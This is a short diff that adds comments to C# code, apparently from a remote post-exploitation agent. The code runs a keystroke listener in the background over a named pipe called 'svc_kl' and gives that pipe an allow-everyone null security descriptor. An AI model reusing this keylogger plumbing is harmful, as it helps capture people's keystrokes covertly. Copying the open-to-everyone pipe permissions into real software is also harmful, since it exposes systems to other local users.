@@ -30,6 +30,7 @@ namespace RemoteReconCore
 #endif
                 try
                 {
+                    //Start the named pipe server and keylog listener in the background
                     Agent.t = new Thread(() =>
                     {
                         ReceiveKeyStrokes();
@@ -59,7 +60,7 @@ namespace RemoteReconCore
 
             try
             {
-                
+                //Used PInvoke here instead of the IO.Pipes class because that class does not have a PeekNamedPipe method
                 IntPtr sa = CreateNullDescriptorPtr();
                 hPipe = CreateNamedPipe(@"\\.\pipe\svc_kl",
                                                PIPE_ACCESS_INBOUND,
@@ -72,6 +73,7 @@ namespace RemoteReconCore
 #if DEBUG
                 Console.WriteLine("Waiting for client to connect");
 #endif
+                //Blocking call to wait for a client to connect
                 ConnectNamedPipe(hPipe, IntPtr.Zero);
             }
             catch (Exception e)
@@ -147,6 +149,7 @@ namespace RemoteReconCore
             
         }
 
+        //Helper function to create a SECURITY_ATTRIBUTES structure with a allow everyone Security Descriptor
         private static IntPtr CreateNullDescriptorPtr()
         {
             RawSecurityDescriptor gsd = new RawSecurityDescriptor(ControlFlags.DiscretionaryAclPresent, null, null, null, null);
@@ -164,7 +167,7 @@ namespace RemoteReconCore
             return sec;
         }
 
-
+        //PInvoke Definitions
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern IntPtr CreateNamedPipe(string Pipename,
                                                       uint dwOpenMode,
